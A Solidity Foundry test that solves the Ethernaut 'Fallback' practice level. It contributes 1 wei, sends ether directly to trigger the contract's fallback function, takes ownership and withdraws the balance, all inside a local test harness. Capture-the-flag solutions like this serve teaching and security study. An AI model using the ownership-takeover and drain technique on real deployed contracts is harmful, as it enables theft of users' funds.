// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../Ethernaut.sol";
import "../Fallback/FallbackFactory.sol";

contract FallbackTest is DSTest {
    // 0x710... is a special address
    // See https://onbjerg.github.io/foundry-book/forge/cheatcodes.html
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address eoaAddress = address(100);

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(eoaAddress, 5 ether);
    }

    function testFallbackSolution() public {
        // Setup
        FallbackFactory fallbackFactory = new FallbackFactory();
        ethernaut.registerLevel(fallbackFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(fallbackFactory);
        Fallback fallbackContract = Fallback(payable(levelAddress));

        // Solution
        fallbackContract.contribute{value: 1 wei}(); // contribute 1 wei
        assertEq(fallbackContract.getContribution(), 1);
        (bool success, bytes memory data) = address(fallbackContract).call{value: 1 wei}(""); // invoke fallback()
        assert(success);
        assertEq(fallbackContract.owner(), eoaAddress);
        fallbackContract.withdraw(); // invoke withdraw

        // Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
